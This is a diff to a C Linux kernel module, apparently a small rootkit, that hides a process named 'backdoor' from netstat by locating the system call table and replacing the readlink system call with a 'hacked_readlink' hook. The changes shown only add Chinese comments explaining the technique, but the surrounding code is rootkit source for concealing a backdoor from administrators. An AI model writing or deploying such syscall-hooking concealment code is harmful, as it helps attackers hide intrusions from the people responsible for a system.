@@ -3,7 +3,8 @@
  * @email xiefangkui@outlook.com
  * @create date 2017-11-03 04:28:30
  * @modify date 2017-11-03 04:28:30
- * @desc [description]
+ * @desc 使特定进程名对与netstat隐藏 在ubuntu 12.04环境中测试有效，其他环境不明
+ *       通过修改readlink系统调用实现
 */
 #include <linux/module.h> /* Needed by all modules */
 #include <linux/kernel.h> /* Needed for KERN_INFO */
@@ -20,10 +21,11 @@
 #define _AUTHOR_ "xiefangkui"
 #define _DESC_ "Hide netstat"
 
-#define FILT_PS_NAME "backdoor"
+#define FILT_PS_NAME "backdoor"  // 隐藏进程名宏定义
 
-static unsigned long **sct;
-ssize_t (*orig_readlink)(const char *pathname, char *buf, size_t bufsize);
+static unsigned long **sct;  // 系统调用表
+
+ssize_t (*orig_readlink)(const char *pathname, char *buf, size_t bufsize);  // 原系统调用函数指针
 
 asmlinkage ssize_t hacked_readlink(const char *, char *, size_t);
 void *find_sys_call_table(void);
@@ -61,8 +63,8 @@ void *find_sys_call_table(void)
     printk("system_call: %lx\n", system_call);
     code_ptr = (char *)system_call;
     for (i = 0; i < (100 - 2); i++)
-    { // 从0x80中断服务例程中搜索sys_call_table的地址，即通过找到第一个call指令
-        //的机器码8514ff来获取sys_call_table
+    {   // 从0x80中断服务例程中搜索sys_call_table的地址，即通过找到第一个call指令
+        // 的机器码8514ff来获取sys_call_table
         if (code_ptr[i] == call_hex[0] && code_ptr[i + 1] == call_hex[1] && code_ptr[i + 2] == call_hex[2])
         {
             p = &code_ptr[i] + 3;
@@ -112,6 +114,8 @@ asmlinkage ssize_t hacked_readlink(const char *pathname, char *buf, size_t bufsi
     ssize_t count = 0;
 
     // 将kernel对内存地址检查的处理方式改为内核空间
+    // 虚拟文件系统对文件的操作函数集合，会对传入的参数进行判断，如果参数不属于用户空间
+    // 函数会直接返回一个错误
     mm_segment_t old_fs;
     old_fs = get_fs();
     set_fs(KERNEL_DS);
